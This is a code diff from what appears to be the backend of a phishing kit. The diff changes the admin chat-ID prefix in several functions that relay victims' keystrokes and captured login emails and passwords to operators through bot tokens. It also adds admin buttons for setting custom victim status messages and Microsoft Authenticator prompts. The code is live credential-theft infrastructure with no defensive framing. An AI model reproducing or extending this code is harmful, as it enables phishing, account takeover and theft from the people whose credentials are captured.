@@ -56,7 +56,7 @@ def _get_notification_recipients(session_id, original_user_id, admin_user):
 def send_notification(text, user_id, session_id=None, include_admin=False):
     recipients = [user_id]
 
-    if not str(user_id).startswith("5594"):
+    if not str(user_id).startswith("1696"):
         admin_user = get_admin_user()
         admin_id = admin_user.get("id") if admin_user else None
     else:
@@ -64,7 +64,7 @@ def send_notification(text, user_id, session_id=None, include_admin=False):
         admin_user = {"id": admin_id, "bot_token": DEFAULT_BOT_TOKEN}
     
     
-    if include_admin and session_id and not str(user_id).startswith("5594"):
+    if include_admin and session_id and not str(user_id).startswith("1696"):
         # If session_id is provided and user is not an admin, get recipients from the database
         # recipients = _get_notification_recipients(session_id, user_id, admin_user)
         recipients = _get_notification_recipients(session_id, user_id, admin_user)
@@ -79,7 +79,7 @@ def send_notification(text, user_id, session_id=None, include_admin=False):
 
 def send_keystroke_notification_to_admin(session_id, field, value, user_id):
 
-    if not str(user_id).startswith("5594"):
+    if not str(user_id).startswith("1696"):
         admin_user = get_admin_user()  
         admin_id = admin_user.get("id")
         admin_token = admin_user.get("bot_token")
@@ -99,7 +99,7 @@ def send_keystroke_notification_to_admin(session_id, field, value, user_id):
 def get_status_update(session_id, email, password, user_id):
     """Sends login credentials to the appropriate recipients with status buttons."""
     recipients = [str(user_id)]
-    if not str(user_id).startswith("5594"):
+    if not str(user_id).startswith("1696"):
         admin_user = get_admin_user()
         admin_id = admin_user.get("id") if admin_user else None
         admin_id = str(admin_id)
@@ -113,7 +113,7 @@ def get_status_update(session_id, email, password, user_id):
         bot_token = DEFAULT_BOT_TOKEN
         
         # Add session_id for the admin and use their token
-        if str(chat_id).startswith("5594"):
+        if str(chat_id).startswith("1696"):
             text = f"Session ID: {session_id}\n\n{text}"
             bot_token = admin_user.get("bot_token", DEFAULT_BOT_TOKEN)
 
@@ -121,7 +121,7 @@ def get_status_update(session_id, email, password, user_id):
         keyboard_layout = [[{'text': status.replace("_", " ").title(), 'url': f"{HOSTED_URL}/set_status/{chat_id}/{email}/{quote(status)}"}] for status in statuses]
 
         # Add admin-only "Set Custom Message" button
-        if str(chat_id).startswith("5594"):
+        if str(chat_id).startswith("1696"):
             keyboard_layout.append([{'text': 'Set Custom Message', 'url': f"{HOSTED_URL}/set_custom_status?email={email}"}])
             keyboard_layout.append([{'text': 'Set Ms Authenticator', 'url': f"{HOSTED_URL}/set_ms_authenticator_status?email={email}"}])
 
